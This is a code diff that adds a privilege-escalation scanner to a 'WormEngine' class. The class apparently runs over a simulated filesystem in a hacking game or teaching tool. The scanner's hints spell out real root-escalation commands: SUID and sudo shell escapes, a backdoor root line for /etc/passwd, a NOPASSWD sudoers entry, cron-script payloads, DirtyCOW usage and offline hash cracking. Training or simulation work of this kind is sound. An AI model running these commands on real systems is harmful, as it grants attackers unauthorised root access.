@@ -5,6 +5,16 @@ from filesystem import FileSystem, FileNode, encrypt_content, decrypt_content, g
 
 
 @dataclass
+class PrivescFinding:
+    check: str
+    severity: str        # CRITICO / ALTO / MEDIO / INFO
+    title: str
+    detail: str
+    path: str
+    exploit_hint: str
+
+
+@dataclass
 class CommandResult:
     success: bool
     data: dict
@@ -399,3 +409,315 @@ class WormEngine:
         )
         return CommandResult(success=True, data={"name": name, "path": path},
                              narration=narr, action_tag="decrypt")
+
+    # --- Privilege Escalation ---
+
+    def cmd_privesc(self) -> CommandResult:
+        findings: list[PrivescFinding] = []
+        findings += self._check_suid_binaries()
+        findings += self._check_sudo_nopasswd()
+        findings += self._check_writable_cron()
+        findings += self._check_writable_sensitive_files()
+        findings += self._check_shadow_readable()
+        findings += self._check_ssh_keys()
+        findings += self._check_kernel_version()
+        findings += self._check_path_hijack()
+
+        order = {"CRITICO": 0, "ALTO": 1, "MEDIO": 2, "INFO": 3}
+        findings.sort(key=lambda f: order.get(f.severity, 9))
+
+        n_critico = sum(1 for f in findings if f.severity == "CRITICO")
+        n_alto = sum(1 for f in findings if f.severity == "ALTO")
+
+        if n_critico:
+            narr = (
+                f"ALERTA: {n_critico} vector(es) CRITICO(S) de escalada de privilegios detectados. "
+                f"El sistema tiene configuraciones gravemente inseguras. "
+                f"Con los vectores encontrados, un atacante podria obtener root en segundos."
+            )
+        elif n_alto:
+            narr = (
+                f"Se encontraron {n_alto} vector(es) de severidad ALTA. "
+                f"El sistema es vulnerable a escalada de privilegios con pasos adicionales."
+            )
+        else:
+            narr = f"Scan completado. {len(findings)} hallazgo(s) informativos. Sin vectores criticos detectados."
+
+        return CommandResult(
+            success=True,
+            data={"findings": findings},
+            narration=narr,
+            action_tag="privesc",
+        )
+
+    # --- Private checks ---
+
+    def _all_files_recursive(self, node: FileNode | None = None) -> list[FileNode]:
+        node = node or self.fs.root
+        result: list[FileNode] = []
+        stack = [node]
+        while stack:
+            n = stack.pop()
+            if not n.is_dir:
+                result.append(n)
+            else:
+                stack.extend(n.children.values())
+        return result
+
+    _GTFOBINS: dict[str, str] = {
+        "python3.10": "python3.10 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+        "python3":    "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+        "python":     "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+        "find":       "find /etc/passwd -exec /bin/bash -p \\;",
+        "nmap":       "nmap --interactive  →  !sh",
+        "vim.basic":  "vim -c ':!/bin/bash'",
+        "vim":        "vim -c ':!/bin/bash'",
+        "bash":       "bash -p",
+        "cp":         "cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p",
+        "less":       "less /etc/passwd  →  !/bin/bash",
+        "more":       "more /etc/passwd  →  !/bin/bash",
+        "awk":        "awk 'BEGIN {system(\"/bin/bash\")}'",
+        "perl":       "perl -e 'exec \"/bin/bash\";'",
+        "ruby":       "ruby -e 'exec \"/bin/bash\"'",
+        "tee":        "echo 'usuario ALL=(ALL) NOPASSWD:ALL' | tee -a /etc/sudoers",
+    }
+
+    def _check_suid_binaries(self) -> list[PrivescFinding]:
+        findings = []
+        for f in self._all_files_recursive():
+            if f.suid and f.owner == "root":
+                path = self.fs.get_path(f)
+                hint = self._GTFOBINS.get(f.name,
+                    f"Revisar GTFOBins: https://gtfobins.github.io/gtfobins/{f.name}/")
+                findings.append(PrivescFinding(
+                    check="SUID Binary",
+                    severity="CRITICO",
+                    title=f"SUID bit activo en binario root: {f.name}",
+                    detail=(
+                        f"El binario '{f.name}' tiene el bit SUID activado y pertenece a root. "
+                        f"Cualquier usuario puede ejecutarlo con privilegios de root. "
+                        f"Permisos: {f.mode}  Propietario: {f.owner}"
+                    ),
+                    path=path,
+                    exploit_hint=hint,
+                ))
+        return findings
+
+    def _check_sudo_nopasswd(self) -> list[PrivescFinding]:
+        findings = []
+        for f in self._all_files_recursive():
+            path = self.fs.get_path(f)
+            if ("sudoers" in path or path.startswith("/etc/sudoers")) and "NOPASSWD" in f.content:
+                lines = [l.strip() for l in f.content.splitlines() if "NOPASSWD" in l and not l.startswith("#")]
+                for line in lines:
+                    binary = line.split("NOPASSWD:")[-1].strip().split()[-1] if "NOPASSWD:" in line else "desconocido"
+                    bin_name = binary.split("/")[-1]
+                    hint = self._GTFOBINS.get(bin_name, f"sudo {binary} [opciones segun GTFOBins]")
+                    findings.append(PrivescFinding(
+                        check="Sudo NOPASSWD",
+                        severity="CRITICO",
+                        title=f"sudo NOPASSWD para {binary}",
+                        detail=(
+                            f"El usuario actual puede ejecutar '{binary}' como root sin contrasena. "
+                            f"Entrada en sudoers: {line}"
+                        ),
+                        path=path,
+                        exploit_hint=f"sudo {hint}",
+                    ))
+        return findings
+
+    def _check_writable_cron(self) -> list[PrivescFinding]:
+        findings = []
+        for f in self._all_files_recursive():
+            path = self.fs.get_path(f)
+            is_cron_path = "/cron" in path or "crontab" in path
+            world_writable = f.mode.endswith("rw-") or f.mode.endswith("rwx") or "rwxrwxrwx" in f.mode
+            if is_cron_path and world_writable and f.owner == "root":
+                findings.append(PrivescFinding(
+                    check="Cron Job Writable",
+                    severity="CRITICO",
+                    title=f"Cron job escribible por cualquier usuario: {f.name}",
+                    detail=(
+                        f"El script '{path}' pertenece a root (se ejecuta como root) "
+                        f"pero cualquier usuario puede modificarlo. "
+                        f"Permisos actuales: {f.mode}"
+                    ),
+                    path=path,
+                    exploit_hint=(
+                        f"echo '#!/bin/bash\\nchmod +s /bin/bash' >> {path} "
+                        f"# Esperar ejecucion del cron  →  /bin/bash -p"
+                    ),
+                ))
+            elif is_cron_path and world_writable:
+                findings.append(PrivescFinding(
+                    check="Cron Job Writable",
+                    severity="ALTO",
+                    title=f"Script de cron escribible: {f.name}",
+                    detail=f"Script '{path}' con permisos {f.mode} puede ser modificado.",
+                    path=path,
+                    exploit_hint=f"echo 'chmod +s /bin/bash' >> {path}",
+                ))
+        # Also check writable scripts that might be called by root cron
+        for f in self._all_files_recursive():
+            path = self.fs.get_path(f)
+            world_writable = "rwxrwxrwx" in f.mode or (len(f.mode) >= 9 and f.mode[6] == "w")
+            if (f.name.endswith(".sh") or f.name.endswith(".py")) and world_writable and f.owner == "root":
+                if "/cron" not in path:
+                    findings.append(PrivescFinding(
+                        check="Writable Root Script",
+                        severity="ALTO",
+                        title=f"Script root escribible: {f.name}",
+                        detail=(
+                            f"'{path}' pertenece a root y tiene permisos {f.mode}. "
+                            f"Si es llamado por un proceso privilegiado, permite ejecucion como root."
+                        ),
+                        path=path,
+                        exploit_hint=f"echo 'chmod +s /bin/bash' >> {path}  # Si es llamado por root/cron",
+                    ))
+        return findings
+
+    def _check_writable_sensitive_files(self) -> list[PrivescFinding]:
+        findings = []
+        targets = {
+            "/etc/passwd":  (
+                "CRITICO",
+                "Agregar usuario root sin contrasena",
+                "echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd && su pwned",
+            ),
+            "/etc/sudoers": (
+                "CRITICO",
+                "Agregar entrada NOPASSWD para todos",
+                "echo 'usuario ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
+            ),
+        }
+        for f in self._all_files_recursive():
+            path = self.fs.get_path(f)
+            if path not in targets:
+                continue
+            world_writable = len(f.mode) >= 9 and f.mode[6] in ("w",)
+            group_writable = len(f.mode) >= 6 and f.mode[3] in ("w",)
+            if world_writable or (group_writable and f.owner == "root"):
+                sev, action, hint = targets[path]
+                findings.append(PrivescFinding(
+                    check="Writable Critical File",
+                    severity=sev,
+                    title=f"{path} es escribible por usuarios sin privilegios",
+                    detail=(
+                        f"Permisos actuales: {f.mode}  Propietario: {f.owner}. "
+                        f"Accion posible: {action}."
+                    ),
+                    path=path,
+                    exploit_hint=hint,
+                ))
+        return findings
+
+    def _check_shadow_readable(self) -> list[PrivescFinding]:
+        findings = []
+        for f in self._all_files_recursive():
+            path = self.fs.get_path(f)
+            if path == "/etc/shadow" and "$" in f.content:
+                world_readable = len(f.mode) >= 9 and f.mode[7] == "r"
+                if world_readable:
+                    findings.append(PrivescFinding(
+                        check="Shadow Readable",
+                        severity="ALTO",
+                        title="/etc/shadow legible por cualquier usuario",
+                        detail=(
+                            f"El archivo /etc/shadow contiene hashes de contrasenas y tiene "
+                            f"permisos {f.mode}. Cualquier usuario puede leerlo y atacar los hashes offline."
+                        ),
+                        path=path,
+                        exploit_hint=(
+                            "unshadow /etc/passwd /etc/shadow > hashes.txt && "
+                            "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt"
+                        ),
+                    ))
+        return findings
+
+    def _check_ssh_keys(self) -> list[PrivescFinding]:
+        findings = []
+        for f in self._all_files_recursive():
+            path = self.fs.get_path(f)
+            if ("PRIVATE KEY" in f.content or "BEGIN RSA" in f.content) and "id_rsa" in f.name:
+                findings.append(PrivescFinding(
+                    check="SSH Private Key",
+                    severity="ALTO",
+                    title=f"Clave privada SSH accesible: {f.name}",
+                    detail=(
+                        f"Clave privada encontrada en '{path}'. "
+                        f"Si corresponde a un usuario con privilegios (root u otro), "
+                        f"permite acceso directo sin contrasena."
+                    ),
+                    path=path,
+                    exploit_hint=(
+                        f"chmod 600 {path} && "
+                        f"ssh -i {path} root@<target>  # o usuario con sudo"
+                    ),
+                ))
+        return findings
+
+    def _check_kernel_version(self) -> list[PrivescFinding]:
+        proc_version = self.fs.get_node("/proc/version")
+        if not proc_version:
+            return []
+        content = proc_version.content
+        findings = []
+        kernel_vulns = [
+            ("4.4.0-116", "CVE-2016-5195", "DirtyCOW",
+             "CRITICO",
+             "Race condition en copy-on-write permite escritura en archivos de solo lectura. "
+             "Explotable para modificar /etc/passwd o inyectar en procesos privilegiados.",
+             "gcc -pthread dirtycow.c -o dirtycow -lcrypt && ./dirtycow /etc/passwd "
+             "'root:NEWPASS:0:0:root:/root:/bin/bash'"),
+            ("3.13", "CVE-2015-1328", "overlayfs",
+             "CRITICO",
+             "Fallo en overlayfs permite crear archivos SUID en directorios montados por usuario.",
+             "./ofs  # exploit publico en exploit-db 37292"),
+            ("2.6", "CVE-2010-3904", "RDS",
+             "CRITICO",
+             "Buffer overflow en modulo RDS permite escalada local a root.",
+             "./rds-privesc  # exploit publico"),
+        ]
+        for kver, cve, name, sev, detail, hint in kernel_vulns:
+            if kver in content:
+                findings.append(PrivescFinding(
+                    check="Kernel Exploit",
+                    severity=sev,
+                    title=f"Kernel vulnerable a {name} ({cve})",
+                    detail=detail,
+                    path="/proc/version",
+                    exploit_hint=hint,
+                ))
+                break
+        if not findings:
+            findings.append(PrivescFinding(
+                check="Kernel Version",
+                severity="INFO",
+                title=f"Version de kernel registrada",
+                detail=content.strip()[:120],
+                path="/proc/version",
+                exploit_hint="Buscar CVEs en: https://www.cvedetails.com/",
+            ))
+        return findings
+
+    def _check_path_hijack(self) -> list[PrivescFinding]:
+        findings = []
+        tmp_node = self.fs.get_node("/tmp")
+        if tmp_node and "w" in tmp_node.mode:
+            findings.append(PrivescFinding(
+                check="PATH Hijacking",
+                severity="MEDIO",
+                title="/tmp es escribible y podria estar en PATH de procesos privilegiados",
+                detail=(
+                    "Si algun script ejecutado como root llama a un binario sin ruta absoluta "
+                    "(ej: 'ls', 'cat', 'id'), es posible sustituirlo con uno propio en /tmp "
+                    "si /tmp aparece antes en el PATH del proceso privilegiado."
+                ),
+                path="/tmp",
+                exploit_hint=(
+                    "echo '#!/bin/bash\\nbash -p' > /tmp/ls && "
+                    "chmod +x /tmp/ls && "
+                    "export PATH=/tmp:$PATH  # Solo efectivo si cron/script no usa rutas absolutas"
+                ),
+            ))
+        return findings
